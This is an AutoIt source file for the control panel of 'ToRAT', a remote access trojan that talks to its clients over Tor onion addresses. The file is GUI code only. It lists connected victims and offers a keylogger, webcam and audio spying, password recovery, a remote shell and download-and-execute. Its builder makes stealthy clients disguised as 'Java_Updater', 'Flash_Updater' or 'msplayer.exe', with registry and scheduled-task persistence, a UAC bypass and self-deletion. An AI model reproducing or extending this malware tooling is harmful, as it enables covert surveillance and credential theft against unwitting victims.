#cs
Known Bugs:
		-->	Bug mit $OwnTab_Style, da diese Variable zur Laufzeit abgefragt wird beim Verstecken und erneuten Anzeigen der Register.
		-->	"Zittern" der alarmierten Register, wenn diese bereits angewählt wurden --> durch blinken mit der selben Farbe
#ce

Local $hGuiMain = GUICreate("ToRAT " & $sVersion & " by Shikutoku Rikanono", 950, 450)
GUISetBkColor(0xCFE0E7)
;~ GUISetBkColor(0xbbbbbb)
GUISetIcon(@ScriptDir & "\System\Icons\ToRAT.ico")
;~ $OwnTab_Style = Random(0, 1, 1)	;random style (only 2 styles available!!)

Local $aTabText[4] = ["     " & $iCurrentConnections & " Connections", "Settings", "Builder", "Log"] ;Declare the regions for the OwnTab-control
Local $aTabIcons[4][2] = [[@ScriptDir & "\System\Icons\Filesystem-socket.ico"], [@ScriptDir & "\System\Icons\Action-run.ico"], [@ScriptDir & "\System\Icons\Treetog-Junior-Tool-box.ico"], [@ScriptDir & "\System\Icons\App-edit.ico"]]
Global $aCtrlTab = _OwnTab_Create($hGuiMain, $aTabText, 5, 5, 940, 410, 30, 0xD5D5D5, 0xCFE0E7, 0xCFE0E7, $aTabIcons) ;, 0xD5D5D5, 0xCFE0E7, 0xCFE0E7
_OwnTab_SetOnEvent($aCtrlTab, "_OwnTab_OnEvent")


Local $aTabTip[5] = ["Show all connected clients", "Edit settings", "Create a new client", "Show the log"]
_OwnTab_SetTip($aCtrlTab, $aTabTip) ;set the tooltips for the OwnTab-control

#Region Tab1
_OwnTab_Add($aCtrlTab) ;Start controls tab1
Global $idLVConnections = GUICtrlCreateListView("Country|OS Language|WAN IP|LAN IP|PC Name|Username|Operating System|Idle Time|Ping|Client ID|Time Connected|Socket", 10, 40, 930, 400, $LVS_SHOWSELALWAYS, BitOR($LVS_EX_SUBITEMIMAGES,$LVS_EX_HEADERDRAGDROP,$LVS_EX_FULLROWSELECT, $WS_EX_CLIENTEDGE)) ;, $LVS_EX_DOUBLEBUFFER ,
GUICtrlSetOnEvent($idLVConnections, "_SortLVConnections")
_GUICtrlListView_RegisterSortCallBack($idLVConnections)

$idLVItemContext = GUICtrlCreateContextMenu($idLVConnections) ;$listview für alte gui
$idMenuRemoteManager	= GUICtrlCreateMenu("Remote Manager", $idLVItemContext)
$idMenuRemoteManagerIco = _GCM_SetIcon(@ScriptDir & "\System\Icons\Everaldo-Crystal-Clear-App-network-connection-manager.ico", $idLVItemContext, 0)
$idMenuFileManager	= GUICtrlCreateMenuItem("File Manager", $idMenuRemoteManager)
$idMenuFileManagerIco = _GCM_SetIcon(@ScriptDir & "\System\Icons\Zerode-Plump-Folder-My-documents.ico", $idMenuRemoteManager, 0)
;~ GUICtrlSetOnEvent($idMenuFileManager, "FileManagerGUI")
$idMenuRegistryManager = GUICtrlCreateMenuItem("Registry Manager", $idMenuRemoteManager)
$idMenuRegistryManagerIco = _GCM_SetIcon(@ScriptDir & "\System\Icons\Tpdkdesign.net-Refresh-Cl-System-Registry.ico", $idMenuRemoteManager, 1)
;~ GUICtrlSetOnEvent($idMenuRegistryManager, "RegistryManagerGUI")
$idMenuProcessManager = GUICtrlCreateMenuItem("Process Manager", $idMenuRemoteManager)
$idMenuProcessManagerIco = _GCM_SetIcon(@ScriptDir & "\System\Icons\Chrisbanks2-Cold-Fusion-Hd-Task-manager.ico", $idMenuRemoteManager, 2)
;~ GUICtrlSetOnEvent($idMenuProcessManager, "ProcessManagerGUI")
$idMenuWindowManager = GUICtrlCreateMenuItem("Window Manager", $idMenuRemoteManager)
$idMenuWindowManagerIco = _GCM_SetIcon(@ScriptDir & "\System\Icons\App-window-list.ico", $idMenuRemoteManager, 3)
;~ GUICtrlSetOnEvent($idMenuWindowManager, "WindowManagerGUI")
$idMenuSoftwareManager = GUICtrlCreateMenuItem("Software Manager", $idMenuRemoteManager)
$idMenuSoftwareManagerIco = _GCM_SetIcon(@ScriptDir & "\System\Icons\App-package-application.ico", $idMenuRemoteManager, 4)
;~ GUICtrlSetOnEvent($idMenuSoftwareManager, "SoftwareManagerGUI")
$idMenuShell	= GUICtrlCreateMenuItem("Remote Shell", $idMenuRemoteManager)
$idMenuShellIco = _GCM_SetIcon(@ScriptDir & "\System\Icons\Everaldo-Crystal-Clear-App-terminal.ico", $idMenuRemoteManager, 5)
GUICtrlSetOnEvent($idMenuShell, "RemoteShellGUI")
$idMenuMisc	= GUICtrlCreateMenu("Misc", $idLVItemContext)
$idMenuMiscIco = _GCM_SetIcon(@ScriptDir & "\System\Icons\Kyo-Tux-Phuzion-Misc-Misc-Box.ico", $idLVItemContext, 1)
$idMenuDaE = GUICtrlCreateMenuItem("Download & Execute", $idMenuMisc)
$idMenuDaEIco = _GCM_SetIcon(@ScriptDir & "\System\Icons\App-world-clock.ico", $idMenuMisc, 0)
;~ GUICtrlSetOnEvent($idMenuDaE, "DownloadAndExeGUI")
$idMenuExecute = GUICtrlCreateMenuItem("Execute AutoIt Command", $idMenuMisc)
$idMenuExecuteIco = _GCM_SetIcon(@ScriptDir & "\System\Icons\au3.ico", $idMenuMisc, 1)
;~ GUICtrlSetOnEvent($idMenuExecute, "ExeAu3GUI")
$idMenuSpyFunctions	= GUICtrlCreateMenu("Spy Functions", $idLVItemContext)
$idMenuSpyFunctionsIco = _GCM_SetIcon(@ScriptDir & "\System\Icons\Itzikgur-My-Seven-Favorities.ico", $idLVItemContext, 2)
$idMenuScreenCap	= GUICtrlCreateMenuItem("Remote Desktop", $idMenuSpyFunctions)
$idMenuScreenCapIco = _GCM_SetIcon(@ScriptDir & "\System\Icons\Mattahan-Buuf-Screenshot-App.ico", $idMenuSpyFunctions, 0)
;~ GUICtrlSetOnEvent($idMenuScreenCap, "ScreencapGUI")
$idMenuWebCap	= GUICtrlCreateMenuItem("Remote Webcam", $idMenuSpyFunctions)
$idMenuWebCapIco = _GCM_SetIcon(@ScriptDir & "\System\Icons\Designcontest-Ecommerce-Business-Video-call-cam.ico", $idMenuSpyFunctions, 1)
;~ GUICtrlSetOnEvent($idMenuWebCap, "WebcamGUI")
$idMenuKeyLog = GUICtrlCreateMenuItem("Keylogger", $idMenuSpyFunctions)
$idMenuKeyLogIco = _GCM_SetIcon(@ScriptDir & "\System\Icons\Aha-Soft-Security-Login.ico", $idMenuSpyFunctions, 2)
;~ GUICtrlSetOnEvent($idMenuKeyLog, "KeyLogGUI")
$idMenuPWRecovery = GUICtrlCreateMenuItem("PW Recovery", $idMenuSpyFunctions)
$idMenuPWRecoveryIco = _GCM_SetIcon(@ScriptDir & "\System\Icons\Everaldo-Crystal-Clear-App-password.ico", $idMenuSpyFunctions, 3)
;~ GUICtrlSetOnEvent($idMenuPWRecovery, "PWRecoveryGUI")
$idMenuAudioSpy = GUICtrlCreateMenuItem("Audio Spy", $idMenuSpyFunctions)
$idMenuAudioSpyIco = _GCM_SetIcon(@ScriptDir & "\System\Icons\App-Multimedia.ico", $idMenuSpyFunctions, 4)
;~ GUICtrlSetOnEvent($idMenuAudioSpy, "AudioSpyGui")
$idMenuClientManager	= GUICtrlCreateMenu("Client Manager", $idLVItemContext)
$idMenuClientManagerIco = _GCM_SetIcon(@ScriptDir & "\System\Icons\App-package-utilities.ico", $idLVItemContext, 3)
$idMenuUpdateClient	= GUICtrlCreateMenuItem("Update Client (Local File)", $idMenuClientManager)
$idMenuUpdateClientIco = _GCM_SetIcon(@ScriptDir & "\System\Icons\Everaldo-Kids-Icons-Agt-update-drivers.ico", $idMenuClientManager, 0)
GUICtrlSetOnEvent($idMenuUpdateClient, "UpdateClient")
$idMenuRestartClient	= GUICtrlCreateMenuItem("Restart Client", $idMenuClientManager)
$idMenuRestartClientIco = _GCM_SetIcon(@ScriptDir & "\System\Icons\Everaldo-Crystal-Clear-App-Quick-restart.ico", $idMenuClientManager, 1)
GUICtrlSetOnEvent($idMenuRestartClient, "RestartClient")
$idMenuCloseClient	= GUICtrlCreateMenuItem("Close Client", $idMenuClientManager)
$idMenuCloseClientIco = _GCM_SetIcon(@ScriptDir & "\System\Icons\Alecive-Flatwoken-Apps-Dialog-Shutdown.ico", $idMenuClientManager, 2)
GUICtrlSetOnEvent($idMenuCloseClient, "CloseClient")
$idMenuUninstallClient	= GUICtrlCreateMenuItem("Uninstall Client", $idMenuClientManager)
$idMenuUninstallClientIco = _GCM_SetIcon(@ScriptDir & "\System\Icons\Fasticon-Isimple-System-Bt-remove.ico", $idMenuClientManager, 3)
GUICtrlSetOnEvent($idMenuUninstallClient, "UninstallClient")

#EndRegion Tab1

#Region Tab2
_OwnTab_Add($aCtrlTab) ;Start controls tab3 Settings
#EndRegion Tab2

#Region Tab3
_OwnTab_Add($aCtrlTab) ;Start controls tab2 Builder
Local $aTabText2[5] = ["General", "Connection", "Install", "Keylogger", "Create Client"] ;Declare the regions for the OwnTab-control
Local $aTabIcons2[5][2] = [[@ScriptDir & "\System\Icons\Treetog-Junior-Folder-identity.ico"], [@ScriptDir & "\System\Icons\Iconshock-Vista-General-Network.ico"], [@ScriptDir & "\System\Icons\Saki-Snowish-Install.ico"], [@ScriptDir & "\System\Icons\Aha-Soft-Security-Login.ico"], [@ScriptDir & "\System\Icons\Aha-Soft-Software-Options.ico"]]
Global $aCtrlTab2 = _OwnTab_Create($hGuiMain, $aTabText2, 10, 40, 930, 370, 30, 0xD5D5D5, 0xCFE0E7, 0xCFE0E7, $aTabIcons2) ;, 0xD5D5D5, 0xCFE0E7, 0xCFE0E7
_OwnTab_SetOnEvent($aCtrlTab2, "_OwnTab_OnEvent2")

_OwnTab_Add($aCtrlTab2) ;Controls General
GUICtrlCreateGroup("General Settings",25,75,900,360,$WS_THICKFRAME,-1)
GUICtrlSetBkColor(-1, 0xCFE0E7)
$idButtonMutex = GUICtrlCreateButton("Mutex: ",55,105)
GUICtrlSetBkColor(-1, 0xCFE0E7)
GUICtrlSetOnEvent(-1, "BuilderMutex")
$idInputMutex = GUICtrlCreateInput("",120, 105, 700, 20)
$idLabelClientTag = GUICtrlCreateLabel("Client Tag:", 55, 145)
GUICtrlSetBkColor(-1, 0xCFE0E7)
$idInputClientTag = GUICtrlCreateInput("Spreading-Methode-01",120, 145, 700, 20)
$idCheckboxUseIcon = GUICtrlCreateCheckbox("Use Icon", 840, 105)
GUICtrlSetBkColor(-1, 0xCFE0E7)
GUICtrlSetState(-1, $GUI_CHECKED)
$idButtonIcon = GUICtrlCreateButton("Icon: ", 55, 185)
GUICtrlSetBkColor(-1, 0xCFE0E7)
GUICtrlSetOnEvent(-1, "BuilderIcon")
$idInputIcon = GUICtrlCreateInput(@ScriptDir & "\System\ClientIcons\Iconbest-Helldesign-Devil-mad.ico", 120, 185, 700, 20)
GUICtrlSetState(-1, $GUI_DISABLE)
$idIconClientIcon = GUICtrlCreateIcon(@ScriptDir & "\System\ClientIcons\Iconbest-Helldesign-Devil-mad.ico", -1, 840, 140, 64, 64)
GUICtrlCreateGroup("", -99, -99, 1, 1) ;close group

_OwnTab_Add($aCtrlTab2) ;Controls Connection
GUICtrlCreateGroup("Connection Settings",25,75,350,360,$WS_THICKFRAME,-1)
GUICtrlSetBkColor(-1, 0xCFE0E7)
$idLabelOnion = GUICtrlCreateLabel("Onion:", 55, 105)
GUICtrlSetBkColor(-1, 0xCFE0E7)
$sDefaultOnion =  StringStripWS(FileRead(@ScriptDir & "\System\Tor\Hidden_Service\hostname"),8)
$idInputOnion = GUICtrlCreateInput($sDefaultOnion, 100, 105, 140, 20)
$idLabelPort = GUICtrlCreateLabel("Port:", 255, 105)
GUICtrlSetBkColor(-1, 0xCFE0E7)
$idInputPort = GUICtrlCreateInput("1594", 290, 105, 50, 20)
$idButtonAdd= GUICtrlCreateButton("Add ",55,135)
GUICtrlSetBkColor(-1, 0xCFE0E7)
GUICtrlSetOnEvent(-1, "BuilderAddConnection")
$idButtonRemove = GUICtrlCreateButton("Remove ",290,135)
GUICtrlSetBkColor(-1, 0xCFE0E7)
GUICtrlSetOnEvent(-1, "BuilderRemoveConnection")
$idListviewOnion = GUICtrlCreateListView("", 55, 165, 285, 240)
_GUICtrlListView_AddColumn($idListviewOnion, "Onion", 200)
_GUICtrlListView_AddColumn($idListviewOnion, "Port", 80)
_GUICtrlListView_AddItem($idListviewOnion, $sDefaultOnion)
_GUICtrlListView_AddSubItem($idListviewOnion, 0, GUICtrlRead($idInputPort), 1)

_OwnTab_Add($aCtrlTab2) ;Controls Install

GUICtrlCreateGroup("Install Settings",25,75,900,360,$WS_THICKFRAME,-1)
GUICtrlSetBkColor(-1, 0xCFE0E7)
$idCheckboxInstallClient = GUICtrlCreateCheckbox("Install Client",55,105,81,20,-1,-1)
GUICtrlSetBkColor(-1, 0xCFE0E7)
GUICtrlSetState(-1, $GUI_CHECKED)
GUICtrlSetOnEvent(-1, "BuilderInstallClient")
$idCheckboxAutostartClient = GUICtrlCreateCheckbox("Autostart Client",380,105,166,20,-1,-1)
GUICtrlSetBkColor(-1, 0xCFE0E7)
GUICtrlSetState(-1, $GUI_CHECKED)
GUICtrlSetOnEvent(-1, "BuilderAutostartClient")

$idGroupInstallLocation = GUICtrlCreateGroup("Install Location",55,130,285,140,$WS_THICKFRAME,-1)
GUICtrlSetBkColor(-1, 0xCFE0E7)
$idRadioAppData = GUICtrlCreateRadio("AppData",65,150,72,20,-1,-1)
GUICtrlSetState(-1, $GUI_CHECKED)
GUICtrlSetBkColor(-1, 0xCFE0E7)
$idRadioLocalAppData = GUICtrlCreateRadio("LocalAppData",160,150,92,20,-1,-1)
GUICtrlSetBkColor(-1, 0xCFE0E7)
$idRadioTemp = GUICtrlCreateRadio("Temp",275,150,50,20,-1,-1)
GUICtrlSetBkColor(-1, 0xCFE0E7)
$idRadioCustomPath = GUICtrlCreateRadio("Custom Path:",65,180,78,20,-1,-1)
GUICtrlSetBkColor(-1, 0xCFE0E7)
$idInputCustomPath = GUICtrlCreateInput("c:\path",175,180,150,20,-1,$WS_EX_CLIENTEDGE)
$idLabelFolder = GUICtrlCreateLabel("Folder:",65,210,50,15,-1,-1)
GUICtrlSetBkColor(-1, 0xCFE0E7)
$idLabelFileName = GUICtrlCreateLabel("File Name:",65,240,50,15,-1,-1)
GUICtrlSetBkColor(-1, 0xCFE0E7)
$idInputFolder = GUICtrlCreateInput("MS WM Player",175,210,150,20,-1,$WS_EX_CLIENTEDGE)
$idInputFileName = GUICtrlCreateInput("msplayer.exe",175,240,150,20,-1,$WS_EX_CLIENTEDGE)
GUICtrlCreateGroup("", -99, -99, 1, 1) ;close group

$idGroupInstallOptions = GUICtrlCreateGroup("Install Options",55,280,285,140,$WS_THICKFRAME,-1)
GUICtrlSetBkColor(-1, 0xCFE0E7)
$idCheckboxPersistence = GUICtrlCreateCheckbox("Persistence",65,300,78,20,-1,-1)
GUICtrlSetBkColor(-1, 0xCFE0E7)
$idCheckboxMelt = GUICtrlCreateCheckbox("Melt Client",65,330,67,20,-1,-1)
GUICtrlSetBkColor(-1, 0xCFE0E7)
$idCheckboxRemoveIcon = GUICtrlCreateCheckbox("Remove Icon",65,360,85,20,-1,-1)
GUICtrlSetBkColor(-1, 0xCFE0E7)
$idCheckboxBypassUAC = GUICtrlCreateCheckbox("Bypass UAC",65,390,82,20,-1,-1)
GUICtrlSetBkColor(-1, 0xCFE0E7)
$idCheckboxDelay = GUICtrlCreateCheckbox("Delay:",205,300,56,20,-1,-1)
GUICtrlSetBkColor(-1, 0xCFE0E7)
$idInputDelay = GUICtrlCreateInput("300",275,300,50,20,-1,$WS_EX_CLIENTEDGE)
GUICtrlCreateGroup("", -99, -99, 1, 1) ;close group

$idGroupAutostartMethod = GUICtrlCreateGroup("Autostart Method",380,130,503,237,$WS_THICKFRAME,-1)
GUICtrlSetBkColor(-1, 0xCFE0E7)
$idCheckboxHKCURun = GUICtrlCreateCheckbox("HKCU Run:",390,150,74,20,-1,-1)
GUICtrlSetState(-1, $GUI_CHECKED)
GUICtrlSetBkColor(-1, 0xCFE0E7)
$idCheckboxHKCULoad = GUICtrlCreateCheckbox("HKCU Load Key",390,180,96,20,-1,-1)
GUICtrlSetBkColor(-1, 0xCFE0E7)
$idCheckboxStartupDir = GUICtrlCreateCheckbox("User Startup Dir:",390,210,96,20,-1,-1)
GUICtrlSetBkColor(-1, 0xCFE0E7)
$idCheckboxTaskScheduler = GUICtrlCreateCheckbox("Task Scheduler:",390,240,97,20,-1,-1)
GUICtrlSetBkColor(-1, 0xCFE0E7)
$idInputHKCURun = GUICtrlCreateInput("Java_Updater",500,150,90,20,-1,$WS_EX_CLIENTEDGE)
$idInputStartupDir = GUICtrlCreateInput("Office Toolbar.lnk",500,210,90,20,-1,$WS_EX_CLIENTEDGE)
$idInputTaskScheduler = GUICtrlCreateInput("MS_Cleanup",500,240,90,20,-1,$WS_EX_CLIENTEDGE)
$idCheckboxHKLMUserInit = GUICtrlCreateCheckbox("HKLM UserInit Key",630,180,112,20,-1,-1)
GUICtrlSetBkColor(-1, 0xCFE0E7)
GUICtrlCreateIcon(@ScriptDir & "\System\Icons\Tpdkdesign.net-Refresh-Cl-System-Security-Center.ico", -1, 610, 180, 16, 16)
$idCheckboxHKLMRun = GUICtrlCreateCheckbox("HKLM Run:",630,150,78,20,-1,-1)
GUICtrlSetBkColor(-1, 0xCFE0E7)
GUICtrlCreateIcon(@ScriptDir & "\System\Icons\Tpdkdesign.net-Refresh-Cl-System-Security-Center.ico", -1, 610, 150, 16, 16)
$idCheckboxHKLMPolicies = GUICtrlCreateCheckbox("HKLM Policies\Explorer\Run:",410,300,160,20,-1,-1)
GUICtrlSetBkColor(-1, 0xCFE0E7)
GUICtrlCreateIcon(@ScriptDir & "\System\Icons\Tpdkdesign.net-Refresh-Cl-System-Security-Center.ico", -1, 390, 300, 16, 16)
$idCheckboxAllStartupDir = GUICtrlCreateCheckbox("AllUser Startup Dir:",630,210,112,20,-1,-1)
GUICtrlSetBkColor(-1, 0xCFE0E7)
GUICtrlCreateIcon(@ScriptDir & "\System\Icons\Tpdkdesign.net-Refresh-Cl-System-Security-Center.ico", -1, 610, 210, 16, 16)
$idCheckboxAdminTaskScheduler = GUICtrlCreateCheckbox("Task Scheduler (Admin):",630,240,134,20,-1,-1)
GUICtrlSetBkColor(-1, 0xCFE0E7)
GUICtrlCreateIcon(@ScriptDir & "\System\Icons\Tpdkdesign.net-Refresh-Cl-System-Security-Center.ico", -1, 610, 240, 16, 16)
$idCheckboxHKCUPolicies = GUICtrlCreateCheckbox("HKCU Policies\Explorer\Run:",410,270,160,20,-1,-1)
GUICtrlSetBkColor(-1, 0xCFE0E7)
GUICtrlCreateIcon(@ScriptDir & "\System\Icons\Tpdkdesign.net-Refresh-Cl-System-Security-Center.ico", -1, 390, 270, 16, 16)
$idCheckboxHKLMActivX = GUICtrlCreateCheckbox("HKLM ActiveX:",410,330,93,20,-1,-1)
GUICtrlSetBkColor(-1, 0xCFE0E7)
GUICtrlCreateIcon(@ScriptDir & "\System\Icons\Tpdkdesign.net-Refresh-Cl-System-Security-Center.ico", -1, 390, 330, 16, 16)
$idInputHKLMRun = GUICtrlCreateInput("Java_Updater",770,150,90,20,-1,$WS_EX_CLIENTEDGE)
$idInputAllStartupDir = GUICtrlCreateInput("OfficeToolbar.lnk",770,210,90,20,-1,$WS_EX_CLIENTEDGE)
$idInputAdminTaskScheduler = GUICtrlCreateInput("MS_DiskCleanup",770,240,90,20,-1,$WS_EX_CLIENTEDGE)
$idInputHKCUPolicies = GUICtrlCreateInput("Flash_Updater",590,270,90,20,-1,$WS_EX_CLIENTEDGE)
$idInputHKLMPolicies = GUICtrlCreateInput("Flash_Updater",590,300,90,20,-1,$WS_EX_CLIENTEDGE)
$idInputHKLMActivX = GUICtrlCreateInput("{CUJ8I3HK-1556-JUJX-8524-BT0P88A84421}",590,330,270,20,-1,$WS_EX_CLIENTEDGE)
GUICtrlCreateGroup("", -99, -99, 1, 1) ;close group
GUICtrlCreateLabel("Client needs to be executed with elevated admin rights",410,390)
GUICtrlSetBkColor(-1, 0xCFE0E7)
GUICtrlCreateIcon(@ScriptDir & "\System\Icons\Tpdkdesign.net-Refresh-Cl-System-Security-Center.ico", -1, 390, 390, 16, 16)
GUICtrlCreateGroup("", -99, -99, 1, 1) ;close group

_OwnTab_Add($aCtrlTab2) ;Controls Keylogger


_OwnTab_Add($aCtrlTab2) ;Controls Create Client
GUICtrlCreateGroup("Create Client", 25, 75, 900, 360,$WS_THICKFRAME,-1)
GUICtrlSetBkColor(-1, 0xCFE0E7)

GUICtrlCreateGroup("Build Method", 40, 110, 150, 120, $WS_THICKFRAME,-1)
GUICtrlSetBkColor(-1, 0xCFE0E7)
$idRadioEoF = GUICtrlCreateRadio("EoF", 60, 140)
GUICtrlSetBkColor(-1, 0xCFE0E7)
$idRadioResource = GUICtrlCreateRadio("RCDATA", 60, 165)
GUICtrlSetState(-1, $GUI_CHECKED)
GUICtrlSetBkColor(-1, 0xCFE0E7)
;~ $idRadioCompile = GUICtrlCreateRadio("Compile", 60, 190)
;~ GUICtrlSetBkColor(-1, 0xCFE0E7)
GUICtrlCreateGroup("", -99, -99, 1, 1) ;close group
$idEditBuildLog = GUICtrlCreateEdit("", 40, 240, 750, 150, BitOR($ES_READONLY, $WS_VSCROLL, $ES_AUTOVSCROLL), BitOR($WS_EX_CLIENTEDGE,$WS_EX_STATICEDGE))
$idProgressBuildLog = GUICtrlCreateProgress(40, 400, 750, 20, $PBS_SMOOTH)
$idButtonCreateClient = GUICtrlCreateButton("Create Client",840, 390)
GUICtrlSetBkColor(-1, 0xCFE0E7)
GUICtrlSetOnEvent(-1, "BuilderCreateClient")
GUICtrlCreateGroup("", -99, -99, 1, 1) ;close group

_OwnTab_End($aCtrlTab2)

;~ _OwnTab_Disable($aCtrlTab2, 2)
;~ _OwnTab_Disable($aCtrlTab2, 3)
;~ _OwnTab_Disable($aCtrlTab2, 4)


#EndRegion Tab3

#Region Tab4
_OwnTab_Add($aCtrlTab) ;Start controls tab4 Log
Global $idEditLog = GUICtrlCreateEdit("", 10, 40, 930, 400)
_GUICtrlEdit_SetLimitText($idEditLog,999999999)
#EndRegion Tab4

_OwnTab_End($aCtrlTab) ;new: end control-definition AND inizialize the OwnTab

_OwnTab_SetFontCol($aCtrlTab, 0xFF) ;new: set font-color

GUISetState()

_OwnTab_Hover($aCtrlTab, 0xFFFF88) ;start hover-function if you want
_OwnTab_AlarmInit()

GUISetOnEvent($GUI_EVENT_CLOSE, "CLOSEClickedMain")

Func _OwnTab_OnEvent()
	For $i = 1 To UBound($aCtrlTab, 1) -1
		If @GUI_CtrlId = $aCtrlTab[$i][0] Then ExitLoop
	Next

	If $i < UBound($aCtrlTab, 1) Then
		_OwnTab_Switch($aCtrlTab, $i)
		If $i = 3 Then ;Builder
;~ 			MsgBox(0,"","1")
;~ 			GUICtrlSetState($idInputOnion, $GUI_HIDE)
			_OwnTab_Switch($aCtrlTab2, $aCtrlTab2[0][0], 1)
;~ 			MsgBox(0,"","2")
		EndIf
	EndIf
EndFunc

Func _OwnTab_OnEvent2()
	For $i = 1 To UBound($aCtrlTab2, 1) -1
		If @GUI_CtrlId = $aCtrlTab2[$i][0] Then ExitLoop
	Next

	If $i < UBound($aCtrlTab2, 1) Then
		_OwnTab_Switch($aCtrlTab2, $i)
		If $i = 2 Then ;Connection
			GUICtrlSetData($idInputOnion, $sDefaultOnion)
		EndIf
	EndIf
EndFunc
